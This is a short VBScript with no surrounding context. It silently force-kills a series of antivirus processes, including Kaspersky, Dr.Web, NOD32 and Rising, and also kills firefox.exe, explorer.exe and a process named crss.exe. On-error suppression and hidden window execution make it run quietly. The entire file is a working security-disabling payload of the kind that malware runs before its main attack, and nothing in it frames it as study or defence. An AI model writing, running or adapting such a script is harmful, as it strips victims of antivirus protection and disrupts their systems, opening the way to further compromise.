on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.run"taskkill /f /im avp.exe",0 
s.run"taskkill /f /im drweb.exe",0 
s.run"taskkill /f /im nod32.exe",0 
s.run"taskkill /f /im esafe.exe",0 
s.run"taskkill /f /im Nmain.exe",0 
s.run"taskkill /f /im Rav7win.exe",0 
s.run"taskkill /f /im nod32kui.exe",0 
s.run"taskkill /f /im Rav7win.exe",0 
s.run"taskkill /f /im crss.exe",0 
s.run"taskkill /f /im firefox.exe",0 
s.run"taskkill /f /im explorer.exe",0 

